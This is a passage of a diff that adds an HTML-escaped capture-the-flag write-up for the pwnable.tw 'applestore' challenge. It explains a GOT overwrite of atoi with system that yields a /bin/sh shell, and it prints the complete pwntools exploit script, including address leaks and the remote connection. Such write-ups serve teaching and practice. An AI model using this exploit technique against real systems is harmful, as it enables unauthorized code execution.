+we control is &lt;code&gt;input_str&lt;&#x2F;code&gt; in the &lt;code&gt;handler&lt;&#x2F;code&gt; function&#x27;s stack frame. This is at offset &lt;code&gt;+0x22&lt;&#x2F;code&gt; from handlers&#x27;s EBP. Thus, 
+if we set the previous pointer to &lt;code&gt;atoi + 0x22&lt;&#x2F;code&gt;, the GOT entry for &lt;code&gt;atoi&lt;&#x2F;code&gt; will be overwritten with our input.&lt;&#x2F;p&gt;
+&lt;p&gt;The following diagram illustrates our attack:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;object data=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f478a5e5f6cee02e28f0456.svg&quot; type=&quot;image&#x2F;svg+xml&quot;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The following overwrites the addresses:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;delete(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x8048f88&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;DELETE_EBP &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;atoi&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;obtaining-a-shell&quot;&gt;Obtaining a shell&lt;&#x2F;h2&gt;
+&lt;p&gt;We can overwrite the GOT entry for atoi with the address of system. Now all we have to do is pass &lt;code&gt;&#x2F;bin&#x2F;sh&lt;&#x2F;code&gt; in the call 
+to atoi. Since our input buffer in &lt;code&gt;handle&lt;&#x2F;code&gt; overwrites the GOT entry, our input starts with the address of system and 
+includes &lt;code&gt;;&#x2F;bin&#x2F;sh;&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, p32(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;;&#x2F;bin&#x2F;sh;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+r.interactive()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-applestore&#x2F;5f478a755f6cee02e28f0458.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;full-script&quot;&gt;Full script&lt;&#x2F;h1&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python3
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;.&#x2F;applestore&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;.&#x2F;libc_32.so.6&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+ld &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;.&#x2F;ld-2.23.so&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+context.binary &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;elf
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;args.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LOCAL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;process([ld.path, elf.path], env&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;LD_PRELOAD&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;: libc.path})
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;chall.pwnable.tw&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10104&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+
+r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;conn()
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;list&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(idx):
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, idx)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;delete&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(idx):
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Item Number&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, idx)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;cart&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(confirmation):
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;4&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, confirmation)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;checkout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(confirmation):
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;5&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.sendafter(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, confirmation)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;19&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+	add(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+	add(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+add(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;4&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+checkout(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;y&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;create_cart_struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(name_ptr, price_int, next_ptr&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, prev_ptr&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;):
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(name_ptr) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(price_int) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(next_ptr) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(prev_ptr)
+
+cart(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;yy&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;read&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x8049028&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_READ_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u32(r.read(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_READ_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;read&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]
+
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leaked libc.read address: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_READ_ADDR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base address:  &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.address))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;__malloc_hook address:    &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;environ** address:        &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;environ&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))
+
+cart(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;yy&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;environ&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ENVIRON_STACK &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u32(r.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;DELETE_EBP &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ENVIRON_STACK &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;260
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;environ stack address:    &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ENVIRON_STACK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;delete ebp address:       &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;DELETE_EBP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;atoi got address:         &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;atoi&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))
+
+
+delete(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;27&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;create_cart_struct(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x8048f88&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;DELETE_EBP &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0xc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, elf.got[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;atoi&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x22&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
